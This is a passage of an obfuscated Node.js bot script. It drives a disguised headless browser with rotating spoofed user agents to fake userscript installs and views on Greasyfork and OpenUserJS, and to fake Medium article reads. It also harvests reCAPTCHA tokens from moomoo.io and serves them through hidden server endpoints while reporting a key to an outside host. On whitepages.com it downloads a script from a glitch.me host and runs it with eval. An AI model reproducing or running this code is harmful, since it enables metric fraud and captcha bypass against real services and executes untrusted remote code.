      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x5) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + V(0x9) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    V(0x14) + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    W(0x3) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + W(0xb) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + W(0x15) + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1cb9 + -0x1f38 + 0x27f
  };

function a() {
  const bi = [
    'B2n1BwvUDevSzq',
    'nSknWOVcUSkxhmkIW57dI8oX',
    'WOnSW5tcRW',
    'Mozilla/5.',
    'W5CGW6H2xc/dRN4NoG',
    'CMCVzw4VC2nYAq',
    'oRryU9F9Lv',
    'CMvWzwf0rxH0zq',
    'kuuI4LzKgm',
    'AwTLieDLy2TVkq',
    'y29Tp3bHz2u9oq',
    '\x20(KHTML,\x20l',
    '0qPB5ANSBK',
    'Ahr0Chm6lY9NCG',
    'hmoIW79IW7aoW7K',
    'Dw5RzxiTy29TAq',
    'C2v0vwLUDdmY',
    '9eBwFca-B1',
    'CMCVC2nYAxb0CW',
    'w3RcSSk/W4a9pSojqIa',
    'tw96AwXSys81lG',
    'io/i-asked',
    'n2nrA2vUotL5Dq'
  ];
  a = function() {
    return bi;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x403 + 0x15e7 + 0x4 * -0x479)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x405 + -0x59 * 0x29 + 0x12aa), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2 * -0x652 + 0x2701 + -0x3341 * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1129 + -0x38a + -0xd9f;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1f17 + -0x1662 + -0x8b5; w < getRandomInt(-0x1954 + -0x20cf + 0x3a24, -0x9 * 0x317 + 0x1dbf * -0x1 + 0x3993); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x6acb + -0xd048 * -0x1 + -0x50b3);
        }
      }();
    }, -0x2cc + -0x17b6 + -0x139 * -0x16), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x13cd + -0x2 * -0x60a + 0x7b9;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2f8 * 0x4 + 0x5 * -0x103 + 0x10ef, 0x197 + -0x1afa * -0x1 + -0x327 * 0x9)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x743c * 0x2 + -0x89 * 0x17e + 0x22a16);
    }, 0x587 + -0x1b55 + -0x2 * -0xb19), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xd8 * -0x1a + -0x3cb + 0x19bb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * 0x7dc + 0xa63 + 0x931 * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xa * 0x1c9 + 0x1a2b + -0x851), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x10bc33 + -0x11838f + 0xe82fc);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x3 * -0x1de + -0x3 * 0x2b0 + 0x5 * 0x92);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1da7 + -0x1b51 + -0x18e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1cd * 0x10 + -0x3a3e + 0x769e);
}
doFlags['doOUJS'] && ((async () => {
  const Y = b,
    X = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x8b6 + 0x26 * 0xd0 + 0x1 * -0x2795) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x5f * -0x69 + -0x110e + 0x1c03 * 0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x12ea + -0x21c1 + 0x34ab, D['indexOf']('\x20'));
        return B ? E['slice'](-0x160 + 0x22f8 + 0xd7 * -0x28, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * -0x3d3d + -0x14a + -0x14e3 * 0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x2dbc + -0xab7 * 0x1 + 0x40b),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + X(0x12) + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + Y(0x2, '3lng'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x947 + -0x15 * 0x1 + -0x6b * 0x16; k < -0x1567 * -0x1 + 0x7 * -0x199 + -0xa34; k++)
    setTimeout(f, (0x19 * 0x6e2 + 0x2 * 0xc9ac + -0x1550a) * k * getRandomInt(-0x1 * 0x25b1 + -0x1690 + 0x6 * 0xa0b, 0x851 * -0x2 + 0x51e + -0xd * -0xe3));
  setInterval(() => {
    f();
    for (let l = 0x551 + -0x50b * 0x4 + 0xedb; l < -0x1f91 * -0x1 + -0xa58 + -0x1535; l++)
      setTimeout(f, (-0x1 * 0x325d + -0x1 * 0x16a53 + 0x28710) * l * getRandomInt(0x114 * 0x2 + 0x1609 + 0x810 * -0x3, 0xbdb + 0x35 * 0x14 + -0x7fe * 0x2));
  }, 0x8b9f * 0xc2 + 0x2d93 * 0x1d + -0x3809a5 * 0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
